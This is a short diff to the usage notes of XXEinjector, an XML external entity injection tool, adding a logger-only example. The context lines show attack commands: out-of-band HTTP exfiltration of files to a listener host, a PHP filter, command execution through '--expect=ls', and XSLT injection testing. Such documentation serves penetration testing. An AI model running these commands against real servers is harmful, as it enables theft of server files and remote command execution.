@@ -51,3 +51,5 @@ Example usage:<br />
   ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls<br />
   Testing for XSLT injection:<br />
   ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt<br />
+  Log requests only:<br />
+  ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt<br />
